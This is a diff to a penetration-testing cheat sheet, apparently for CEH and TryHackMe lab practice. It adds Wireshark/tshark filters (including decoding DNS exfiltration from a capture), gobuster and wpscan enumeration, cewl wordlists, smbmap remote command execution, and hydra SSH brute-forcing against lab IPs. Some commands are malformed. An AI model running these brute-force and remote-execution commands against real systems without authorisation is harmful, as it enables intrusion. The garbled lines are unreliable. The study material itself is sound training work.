@@ -159,6 +159,32 @@ In pcap file apply filter:- (you will get all the post request) Now to capture p
 ```console
 http.request.method==POST
 ```
+### wireshark filters
+```console
+### wireshark filters
+
+// filters by post
+http.request.method==POST
+smtp // email
+pop // email
+dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
+dns.flags.response == 0 = There are 56 unique DNS queries.
+tcp // show tcp packets
+//find packets
+edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search
+
+//DDOS ATTACK
+look number of packets first column
+then >statistics > ipv4 statistics > destination and ports
+
+/// tshark cli
+tshark -r dns.cap | wc -l //count how many packets are in a capture
+tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
+tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
+tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
+tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
+tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
+```
 </details>
 
 <details>
@@ -308,6 +334,47 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
  </details>
+<details>
+
+ <summary>Enumeration</summary>
+ 
+ dir enumeration
+
+ ```console
+gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
+```
+```console
+dir : directory listing
+-u : host
+-w : wordlists
+-t : threads int / Number of concurrent threads (default 10)
+-x : enumerate hidden files htm, php
+-q : –quiet / Don’t print the banner and other noise
+
+// wordpress enumeration
+wpscan --url https://localchost.com --passwords=
+wpscan -u 10.10.. -e u vp
+wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
+
+-e = enumerate
+u = enumerate usernames
+vp = vulnerable plugins
+
+// wordlist generation
+cewl -w wordlist -d 2 -m 5 http://wordpress.com
+-d = deeph of the scanning
+-m = long of the words
+-w = save to a file worlist
+```
+### enumerating -samba
+```console
+search for commands
+smbmap --help | grep -i username
+
+smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
+-x = command
+```
+</details>
 <details>
 
   <summary>Nslookup</summary>
@@ -550,6 +617,10 @@ wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
 ### SSH
 ```console
 hydra -l username -P passlist.txt x.x.x.x ssh
+```
+```console
+hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
+hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
 ```
 ### FTP
 ```console
@@ -834,7 +905,7 @@ cp /root/Desktop/filename /var/www/html/share/
 * [Linux](https://tryhackme.com/module/linux-fundamentals)
 * [Nmap](https://tryhackme.com/room/furthernmap)
 * [SQLMAP](https://tryhackme.com/room/sqlmap)
-* [Wireshark](https://tryhackme.com/room/wireshark)
+* [hark](https://tryhackme.com/room/wireshark)
 * [Hydra](https://tryhackme.com/room/hydra)
 * [DVWA](https://tryhackme.com/room/dvwa)
 * [OWASP Top 10](https://tryhackme.com/room/owasptop10)
